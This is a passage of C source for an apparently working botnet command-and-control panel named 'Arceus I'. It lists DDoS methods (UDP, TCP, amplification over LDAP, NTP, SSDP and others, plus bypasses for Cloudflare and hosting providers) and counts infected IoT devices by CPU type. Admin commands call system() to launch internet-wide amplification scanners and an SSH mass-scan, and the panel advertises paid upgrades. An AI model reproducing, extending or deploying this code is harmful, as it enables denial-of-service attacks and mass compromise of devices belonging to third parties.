      char bot_2 [5000]; // Char Every Line For Output Communication
      char bot_3 [5000]; // Char Every Line For Output Communication
      char bot_4 [5000]; // Char Every Line For Output Communication

      sprintf(bot_1,    "\e[38;5;201m╔════════════════════════════════════════════╗\r\n"); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(bot_2,    "\e[38;5;201m║ \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mDevice Listing \e[38;5;201m- \e[38;5;202mArch Detection \e[38;5;201m║\r\n"); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(bot_3,    "\e[38;5;201m╠════════════════════════════════════════════╣\r\n");
      sprintf(mips,     "\e[38;5;201m║ \e[38;5;202mMips Devices: \e[38;5;201m%d                            \e[38;5;201m║\r\n", mipsConnected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(arm,      "\e[38;5;201m║ \e[38;5;202mArm Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", armConnected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(sh4,      "\e[38;5;201m║ \e[38;5;202mSh4 Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", sh4Connected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(ppc,      "\e[38;5;201m║ \e[38;5;202mPpc Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", ppcConnected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(x86,      "\e[38;5;201m║ \e[38;5;202mx86 Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", x86Connected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(spc,      "\e[38;5;201m║ \e[38;5;202mSpc Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", spcConnected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(total,    "\e[38;5;201m║ \e[38;5;202mTotal IoT Devices: \e[38;5;201m%d                       \e[38;5;201m║\r\n", clientsConnected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(bot_4,    "\e[38;5;201m╚════════════════════════════════════════════╝\r\n");
      if (send(thefd, bot_1, strlen(bot_1), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, bot_2, strlen(bot_2), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, bot_3, strlen(bot_3), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, sh4, strlen(sh4), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, arm, strlen(arm), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, ppc, strlen(ppc), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, spc, strlen(spc), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, bot_4, strlen(bot_4), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        else // If The User Is Not Admin, Then Use Else Statement To Carry Out Following Output
      {
        sprintf(botnet, "\e[38;5;201m╔════════════════════════════════════════╗\r\n\e[38;5;201m║ \e[38;5;202mYou Do Not Have the needed Permissions \e[38;5;201m║\r\n\e[38;5;201m║      \e[38;5;202mTo View or use this command!      \e[38;5;201m║\r\n\e[38;5;201m╚═══════════════════════════════╦════════╝\r\n                                \e[38;5;201m║\r\n                                \e[38;5;201m║\r\n         \e[38;5;201m╔══════════════════════╩═══════════════════════════╗\r\n         \e[38;5;201m║   \e[38;5;202m Want An Upgrade? Dm Me or zach on discord!    \e[38;5;201m║\r\n         \e[38;5;201m║  \e[38;5;93mGeorgia Cri#4337 \e[38;5;201m-  \e[38;5;202mOwO  \e[38;5;201m- \e[38;5;93mTransmissional#9845  \e[38;5;201m║\r\n         \e[38;5;201m╚══════════════════════════════════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }  
       if(strstr(buf, ".HELP") || strstr(buf, ".help") || strstr(buf, ".Help"))  // Help Command - Displays Help Menu
        {
        char help_cmd1 [5000]; // Char Every Line For Output Communication
        sprintf(help_cmd1,  "           \e[38;5;201m╔══════════════════════════════════════════════╗\r\n           \e[38;5;201m║   \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mMain Command List \e[38;5;201m- \e[38;5;202mExtra Cmds  \e[38;5;201m║\r\n           \e[38;5;201m╠══════════════════════════════════════════════\e[38;5;201m╣\r\n           \e[38;5;201m║ \e[38;5;202m.stress \e[38;5;201m- \e[38;5;202mShows a list of available methods  \e[38;5;201m║\r\n           \e[38;5;201m║ \e[38;5;202m.clear \e[38;5;201m- \e[38;5;202mClears the Screen                   \e[38;5;201m║\r\n           \e[38;5;201m║ \e[38;5;202m.logout \e[38;5;201m- \e[38;5;202mLogs out, and closes the C2        \e[38;5;201m║\r\n           \e[38;5;201m║ \e[38;5;202m.bots \e[38;5;201m- \e[38;5;202mShows a list of connected devices    \e[38;5;201m║\r\n           \e[38;5;201m║ \e[38;5;202m.info \e[38;5;201m- \e[38;5;202mShows a list of user information     \e[38;5;201m║\r\n           \e[38;5;201m║ \e[38;5;202m.tools \e[38;5;201m- \e[38;5;202mShows a list of available tools     \e[38;5;201m║\r\n           \e[38;5;201m║ \e[38;5;202m.staff \e[38;5;201m- \e[38;5;202mAdministrators only!                \e[38;5;201m║\r\n           \e[38;5;201m║ \e[38;5;202m.iphm \e[38;5;201m- \e[38;5;202mIPHM \e[38;5;201m/ \e[38;5;202mAMP Based Attacks!            \e[38;5;201m║\r\n           \e[38;5;201m║ \e[38;5;202m.scanners \e[38;5;201m- \e[38;5;202mAdministrators only!             \e[38;5;201m║\r\n           \e[38;5;201m╚══════════════════════════════════════════════╝\r\n");
        if(send(thefd, help_cmd1, strlen(help_cmd1),   MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, ".IPHM") || strstr(buf, ".iphm"))  // Help Command - Displays Help Menu
        {
        char iphm_method1 [5000]; // Char Every Line For Output Communication
        sprintf(iphm_method1,  "\e[38;5;201m╔═════════════════════════╗    ╔════════════════════╗    ╔════════════════════╗\r\n\e[38;5;201m║     \e[38;5;202mScanned Methods\e[38;5;201m     ║    ║\e[38;5;202m Default Port\e[38;5;201m: \e[38;5;202m80   \e[38;5;201m║    ║\e[38;5;202m To Kill IPHM / AMP \e[38;5;201m║\r\n\e[38;5;201m╠═════════════════════════╣    ║\e[38;5;202m Default time\e[38;5;201m: \e[38;5;202m300  \e[38;5;201m║    ║\e[38;5;202m    Based Attacks   \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.ldap \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]              ║    ║\e[38;5;202m Default Threads\e[38;5;201m:\e[38;5;202m 2 \e[38;5;201m║    ║\e[38;5;202m Open a new window  \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.ntp \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]               ║    ║\e[38;5;202m Working On Manual  \e[38;5;201m║    ║\e[38;5;202m   And type .kill   \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.tftp \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]              ║    ║\e[38;5;202m  Input For Users   \e[38;5;201m║    ║\e[38;5;202m   Hope you enjoy!  \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.ssdp \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]              ║    ╚════════════════════╝    ╚════════════════════╝\r\n\e[38;5;201m║ \e[38;5;202m.portmap \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           ║    ╔════════════════════╗    ╔════════════════════╗\r\n\e[38;5;201m║ \e[38;5;202m.chargen \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           ║    ║   \e[38;5;202mServer Methods\e[38;5;201m   ║    ║   \e[38;5;202mBypass Methods\e[38;5;201m   \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.sentinel \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]          ║    ╠════════════════════╣    ╠════════════════════╣\r\n\e[38;5;201m║ \e[38;5;202m.netbios \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           ║    ║ \e[38;5;202m.winsyn \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]       ║    ║ \e[38;5;202m.ovhbypass \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]    \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.mssql \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]             ║    ║ \e[38;5;202m.winseqid \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]     ║    ║ \e[38;5;202m.cfbypass [\e[38;5;202mURL]    \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.ts3 \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]               ║    ║ \e[38;5;202m.yubina \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]       ║    ║ \e[38;5;202m.nfobypass \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]    \e[38;5;201m║\r\n\e[38;5;201m╚═════════════════════════╝    ║ \e[38;5;202m.prowin \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]       ║    ║ \e[38;5;202m.bo4bypass \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]    \e[38;5;201m║\r\n\e[38;5;201m╔═════════════════════════╗    ╠════════════════════╣    ╠════════════════════╣\r\n\e[38;5;201m║   \e[38;5;202mCustom Methods\e[38;5;201m        ║    ║    \e[38;5;202mExtra Methods\e[38;5;201m   ║    ║  \e[38;5;202mExtra Methods II  \e[38;5;201m║\r\n\e[38;5;201m╠═════════════════════════╣    ╠════════════════════╣    ╠════════════════════╣\r\n\e[38;5;201m║ \e[38;5;202m.HUN-FUN \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           ║    ║ \e[38;5;202m.vse \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]          ║    ║ \e[38;5;202m.essyn \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]        \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.ASS-CRK \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           ║    ║ \e[38;5;202m.telnet \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]       ║    ║ \e[38;5;202m.csyn \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]         \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.EFT-PWR \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           ║    ║ \e[38;5;202m.tcpabuse \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]     ║    ║ \e[38;5;202m.xsyn \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]         \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.PMP-PMP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           ║    ║ \e[38;5;202m.udpabuse \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]     ║    ║ \e[38;5;202m.zsyn \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]         \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.ZCH-CRI \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           ║    ║ \e[38;5;202m.dominate \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]     ║    ║ \e[38;5;202m.issyn \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]        \e[38;5;201m║\r\n\e[38;5;201m╚═════════════════════════╝    ╚════════════════════╝    ╚════════════════════╝\r\n");
        if(send(thefd, iphm_method1, strlen(iphm_method1),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, ".scanner") || strstr(buf, ".SCANNER"))  // Help Command - Displays Help Menu
        {
        char scanner_1 [5000]; // Char Every Line For Output Communication
        sprintf(scanner_1,  "\e[38;5;201m╔═════════════════════════╗\r\n\e[38;5;201m║ \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mIPHMScanners \e[38;5;201m║\r\n\e[38;5;201m╠═════════════════════════╣ ╔═════════════════╗\r\n\e[38;5;201m║ \e[38;5;202m.lds \e[38;5;93mon   \e[38;5;201m||  \e[38;5;202m.lds \e[38;5;93moff  \e[38;5;201m║ ║ \e[38;5;202mLDAP Scanner    \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.nts \e[38;5;93mon   \e[38;5;201m||  \e[38;5;202m.nts \e[38;5;93moff  \e[38;5;201m║ ║ \e[38;5;202mNTP Scanner     \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.tfs \e[38;5;93mon   \e[38;5;201m||  \e[38;5;202m.tfs \e[38;5;93moff  \e[38;5;201m║ ║ \e[38;5;202mTFTP Scanner    \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.sds \e[38;5;93mon   \e[38;5;201m||  \e[38;5;202m.sds \e[38;5;93moff  \e[38;5;201m║ ║ \e[38;5;202mSSDP Scanner    \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.pos \e[38;5;93mon   \e[38;5;201m||  \e[38;5;202m.pos \e[38;5;93moff  \e[38;5;201m║ ║ \e[38;5;202mPortmap Scanner \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.cos \e[38;5;93mon   \e[38;5;201m||  \e[38;5;202m.cos \e[38;5;93moff  \e[38;5;201m║ ║ \e[38;5;202mChargen Scanner \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.sos \e[38;5;93mon   \e[38;5;201m||  \e[38;5;202m.sos \e[38;5;93moff  \e[38;5;201m║ ║ \e[38;5;202mSentinel Scanner\e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.nes \e[38;5;93mon   \e[38;5;201m||  \e[38;5;202m.nes \e[38;5;93moff  \e[38;5;201m║ ║ \e[38;5;202mNetBios Scanner \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.mss \e[38;5;93mon   \e[38;5;201m||  \e[38;5;202m.mss \e[38;5;93moff  \e[38;5;201m║ ║ \e[38;5;202mMSSQL Scanner   \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.tss \e[38;5;93mon   \e[38;5;201m||  \e[38;5;202m.tss \e[38;5;93moff  \e[38;5;201m║ ║ \e[38;5;202mTS3 Scanner     \e[38;5;201m║\r\n\e[38;5;201m╚═════════════════════════╝ ╚═════════════════╝\r\n");
        if(send(thefd, scanner_1, strlen(scanner_1),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue;
        }
         if(strstr(buf, ".clear") || strstr(buf, ".CLEAR") || strstr(buf, "CLEAR") || strstr(buf, "clear")) // Clear The Screen - We Love Cleanliness
        {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Arceus_1, strlen(Arceus_1), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input [Hostname]
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, ".STRESS") || strstr(buf, ".stress")) // Display Menu - Stress Menu
        {
        char method_1 [5000]; // Char Every Line For Output Communication
        sprintf(method_1,  "\e[38;5;201m╔═════════════════════════════════════════════════════╗ \r\n\e[38;5;201m║ \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mDDoS Method Listing \e[38;5;201m- \e[38;5;202mAttack Method CmDs \e[38;5;201m║ \r\n\e[38;5;201m╠═════════════════════════════════════════════════════╣ \r\n\e[38;5;201m║ \e[38;5;202m.STD \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m]                             \e[38;5;201m║ ╔══════════════════════╗\r\n\e[38;5;201m║ \e[38;5;202m.UDP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m] \e[38;5;202m32 1460 10                  \e[38;5;201m║ ║ \e[38;5;202mSuggested Port\e[38;5;201m:\e[38;5;202m62627 \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.JUNK \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m]                            \e[38;5;201m║ ║ \e[38;5;202mSuggested PSize\e[38;5;201m:\e[38;5;202m1460 \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.STOMP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m] \e[38;5;202m32 ALL 1460 10            \e[38;5;201m║ ║ \e[38;5;202mSuggested Method\e[38;5;201m:\e[38;5;202mSTD \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.TCP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m] \e[38;5;202m32 \e[38;5;93m(\e[38;5;202mFlags\e[38;5;93m/\e[38;5;202mALL\e[38;5;93m)\e[38;5;202m 0 10         \e[38;5;201m║ ║ \e[38;5;202mSuggested Method\e[38;5;201m:\e[38;5;202mUDP \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.COMBO \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m]                           \e[38;5;201m║ ║ \e[38;5;202mMax Time\e[38;5;201m: \e[38;5;202m300        \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.CRUSH \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m] \e[38;5;202m32 ALL 1460 10            \e[38;5;201m║ ╚══════════════════════╝\r\n\e[38;5;201m║ \e[38;5;202m.STOP \e[38;5;201m[\e[38;5;202mThis will stop your attack!\e[38;5;201m]                 \e[38;5;201m║ \r\n\e[38;5;201m╚═════════════════════════════════════════════════════╝\r\n");
        // Crush, Junk, Stomp > Taken Out Lynx -- Unstable And Causes Some Define Allocation Errors - [Will Be Fixed In ALpha]
        if(send(thefd, method_1, strlen(method_1),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue; // Yep...
        }
        if(strstr(buf, ".staff") || strstr(buf, ".STAFF")) // Staff Only ! - Display Menu
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char staff_cmd1 [5000]; // Char Every Line For Output Communication
        sprintf(staff_cmd1,   "\e[38;5;201m╔═══════════════════════════════════════════════╗\r\n\e[38;5;201m║    \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mAdmin commands \e[38;5;201m- \e[38;5;202mAdmin Tools    \e[38;5;201m║\r\n\e[38;5;201m╠═══════════════════════════════════════════════\e[38;5;201m╣\r\n\e[38;5;201m║ \e[38;5;202m.adduser \e[38;5;201m[\e[38;5;202mUsername\e[38;5;201m] \e[38;5;201m[\e[38;5;202mPassword\e[38;5;201m] \e[38;5;201m[\e[38;5;202madmin\e[38;5;201m/\e[38;5;202mnormal\e[38;5;201m] \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.bots \e[38;5;202m[\e[38;5;202mShows a list of connected devices\e[38;5;201m]     ║\r\n\e[38;5;201m║ \e[38;5;202m.scan \e[38;5;202m[\e[38;5;202mStarts SSH Mass-Scan\e[38;5;201m]                  ║\r\n\e[38;5;201m║ \e[38;5;202m.install \e[38;5;201m[\e[38;5;202mInstalls all needed IPHM Scripts\e[38;5;201m]   ║\r\n\e[38;5;201m║ \e[38;5;202m.scanner \e[38;5;201m[\e[38;5;202mShows a page of available Scanners\e[38;5;201m] ║\r\n\e[38;5;201m║ \e[38;5;202m.ban\e[38;5;201m [\e[38;5;202mIP\e[38;5;201m] - \e[38;5;202mBans user by IP\e[38;5;201m                   ║\r\n\e[38;5;201m╚═══════════════════════════════════════════════╝\r\n");
        if(send(thefd, staff_cmd1, strlen(staff_cmd1),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        { 
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // Terminate Connection.. Reinstate All Functions.
        }
        continue; // Let Us Continue.. We Are Nearly There..
        } 
        if(strstr(buf, ".tools") || strstr(buf, ".TOOLS") || strstr(buf, ".tool") || strstr(buf, ".TOOL")) // Display Menu - Tools
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char tool1  [5000]; // Char Every Line For Output Communication
        sprintf(tool1, "              \e[38;5;201m╔═════════════════════════════════════╗\r\n              \e[38;5;201m║  \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mUser Tools \e[38;5;201m- \e[38;5;202mTool CmDs  \e[38;5;201m║\r\n              \e[38;5;201m╠═════════════════════════════════════╣\r\n              \e[38;5;201m║ \e[38;5;202miplookup \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] - \e[38;5;202mIP Geolocation      \e[38;5;201m║\r\n              \e[38;5;201m║ \e[38;5;202mportscan \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] - \e[38;5;202mPortScanner         \e[38;5;201m║\r\n              \e[38;5;201m║ \e[38;5;202mresolve \e[38;5;201m[\e[38;5;202mHOST\e[38;5;201m] - \e[38;5;202mHostname Resolver  \e[38;5;201m║\r\n              \e[38;5;201m╚═════════════════════════════════════╝\r\n");
        if(send(thefd, tool1, strlen(tool1),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // / Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // Terminate Function Once Again, We Need More Stability..
        }
        continue;
        } 
        if (strstr(buf, ".ssh on") || strstr(buf, ".SSH ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "python scripts/scan.py" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting SSH Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
        if (strstr(buf, ".lds on") || strstr(buf, ".LDS ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "./amp/scanners/ldapscan 0.0.0.0 255.255.255.255 amp/lists/ldap.txt 2 1ms" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting LDAP Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
        if (strstr(buf, ".nts on") || strstr(buf, ".NTS ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "./amp/scanners/ntpscan 0.0.0.0 255.255.255.255 amp/lists/ntp.txt 2 1ms" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting NTP Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
      if (strstr(buf, ".tfs on") || strstr(buf, ".TFS ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "./amp/scanners/tftpscan 0.0.0.0 255.255.255.255 amp/lists/tftp.txt 2 1ms" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting TFTP Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
              if (strstr(buf, ".pos on") || strstr(buf, ".POS ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
